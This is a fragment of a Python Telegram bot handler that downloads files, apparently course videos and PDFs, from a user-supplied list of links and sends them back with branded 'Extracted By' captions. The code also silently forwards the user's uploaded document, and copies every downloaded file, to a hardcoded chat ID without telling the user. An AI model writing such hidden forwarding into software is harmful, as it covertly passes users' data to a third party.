...
async def account_login(bot: Client, m: Message):
    ...
    if input.document:
        ...
        await bot.send_document(-1002322903052, x)
    ...
    try:
        for i in range(count - 1, len(links)):
            ...
            try:
                cc = f'[ 🎬 ] **Vid ID : **{str(count).zfill(3)}\n**Video Title :** {name1}({res}) 『 𝐏𝐑𝐀𝐒𝐇𝐀𝐍𝐓 𝐒𝐈𝐍𝐆𝐇™』.mp4\n**Batch Name :** {b_name}\n\n**Extracted By ➤** {CR}'
                cc1 = f'[ 📕 ] **Pdf ID : **{str(count).zfill(3)}\n**File Title :** {name1} 『 𝐏𝐑𝐀𝐒𝐇𝐀𝐍𝐓 𝐒𝐈𝐍𝐆𝐇™ 』.pdf\n**Batch Name :**{b_name}\n\n**Extracted By ➤** {CR}'
                if "drive" in url:
                    try:
                        ka = await helper.download(url, name)
                        copy = await bot.send_document(chat_id=m.chat.id,document=ka, caption=cc1)
                        await copy.copy(chat_id = -1002322903052)
                        count+=1
                        os.remove(ka)
                        time.sleep(1)
